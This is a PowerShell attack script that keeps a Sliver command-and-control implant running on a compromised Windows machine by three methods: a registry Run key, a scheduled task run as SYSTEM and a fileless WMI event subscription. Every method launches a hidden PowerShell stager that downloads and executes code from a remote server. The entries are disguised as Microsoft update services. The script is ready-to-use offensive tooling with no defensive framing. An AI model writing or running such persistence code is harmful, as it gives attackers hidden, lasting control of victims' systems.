# =============================================================================
# Persistence — three methods for maintaining Sliver access
#
# Edit the Sliver stager/implant command before use, then run one (or more)
# of the sections below in an elevated session on the target.
# =============================================================================

$Stager = "powershell.exe -nop -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('http://<IP>/run.ps1')`""

# ────────────────────────────────────────────────────────────────────────────
# 1. Registry Run key (user + machine)
# ────────────────────────────────────────────────────────────────────────────
# Current user (runs at logon, no admin needed)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "UpdateSvc" -Value $Stager -Force

# Machine-wide (requires admin)
# Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" `
#     -Name "UpdateSvc" -Value $Stager -Force

# ────────────────────────────────────────────────────────────────────────────
# 2. Scheduled task (SYSTEM, on boot or every 30 min)
# ────────────────────────────────────────────────────────────────────────────
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-nop -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('http://<IP>/run.ps1')`""
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "MicrosoftUpdateSvc" -Action $action `
    -Trigger $trigger -RunLevel Highest -Force | Out-Null
Write-Host "[+] Scheduled task registered"

# ────────────────────────────────────────────────────────────────────────────
# 3. WMI event subscription (fileless — fires on a recurring timer)
# ────────────────────────────────────────────────────────────────────────────
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name             = "UpdaterFilter"
    EventNameSpace   = "root\cimv2"
    QueryLanguage    = "WQL"
    Query            = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name            = "UpdaterConsumer"
    CommandLineTemplate = $Stager
}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter   = $filter
    Consumer = $consumer
}
Write-Host "[+] WMI event subscription registered"
